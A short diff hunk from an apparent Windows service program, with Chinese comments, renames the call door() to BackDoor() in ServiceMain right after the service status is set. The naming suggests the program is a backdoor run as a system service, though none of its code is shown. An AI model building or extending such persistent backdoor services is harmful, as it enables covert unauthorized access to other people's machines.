@@ -181,7 +181,7 @@ void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
 	//所有的成员须在结构被传递到SetServiceStatus之前正确设置 
 	if(SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
 		bRunning = true;
-		door();  //启动我们的服务 
+		BackDoor();  //启动我们的服务 
 		return; 
  } 
 
